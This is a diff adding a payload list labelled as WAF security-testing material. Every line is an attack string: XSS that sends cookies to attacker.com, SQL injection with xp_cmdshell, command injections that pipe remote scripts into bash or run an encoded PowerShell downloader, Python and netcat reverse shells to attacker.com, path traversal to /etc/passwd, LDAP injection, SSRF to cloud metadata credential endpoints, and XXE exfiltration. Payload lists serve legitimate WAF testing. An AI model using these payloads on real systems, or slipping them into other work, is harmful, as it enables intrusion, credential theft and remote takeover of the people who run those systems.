@@ -1,0 +1,47 @@
+# Enterprise-Grade Security Testing Payloads
+# High-impact payloads for comprehensive WAF evaluation
+
+# Advanced XSS Payloads
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src="x" onerror="this.src='http://attacker.com/steal?'+document.cookie">
+<iframe src="javascript:alert(`XSS`)"></iframe>
+<details open ontoggle="alert(1)">
+<marquee onstart="alert(1)">
+
+# Complex SQL Injection Payloads
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+'; WAITFOR DELAY '00:00:05' --
+' UNION SELECT table_name,column_name FROM information_schema.columns --
+'; EXEC xp_cmdshell('dir'); --
+' OR 1=1 INTO OUTFILE '/tmp/evil.txt' --
+
+# Advanced Command Injection Payloads
+; curl http://attacker.com/shell.sh | bash
+| powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA
+& echo "vulnerable" > /tmp/proof.txt
+$(python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);")
+`nc -e /bin/bash attacker.com 4444`
+
+# Sophisticated Path Traversal Payloads
+..%252f..%252f..%252fetc%252fpasswd
+....//....//....//etc/passwd%00
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+....\/....\/....\/etc/passwd
+
+# Complex LDAP Injection Payloads
+*)(uid=*))(|(uid=*
+*)(|(mail=*))
+*))%00(cn=administrators)(|(cn=*
+*))(|(objectClass=*)
+
+# Advanced SSRF Payloads
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://127.0.0.1:6379/
+gopher://127.0.0.1:3306/_show%20databases;
+dict://attacker.com:11211/stat
+
+# Sophisticated XXE Payloads
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%intern;%trick;]><root></root>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><data>&file;</data>
